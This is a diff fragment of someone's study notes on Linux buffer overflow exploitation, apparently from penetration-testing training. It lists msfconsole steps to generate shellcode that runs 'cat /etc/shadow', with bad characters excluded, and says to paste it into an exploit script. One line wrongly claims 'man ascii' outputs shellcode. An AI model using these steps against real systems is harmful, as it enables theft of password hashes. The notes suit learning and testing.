@@ -1053,9 +1053,17 @@ this throw 200 characters at it
 4. generate shellcode
 	msfconsole (update if you have to)
 	   use payload/linux/x86/exec
-	
+           set CMD cat /etc/shadow
+	   show options
+	   generate -b "\x00\x20\x0a\x0d" -f python << says what not to use (bad characters)
+	   
+	   
+       man ascii << this spits out the shellcode
+       
+       GO BACK TO THE linux_buffer.py and copy and paste the shellcoe into the section listed for shellcode
+	   
 	linux privileges
-
+	
 
 
 
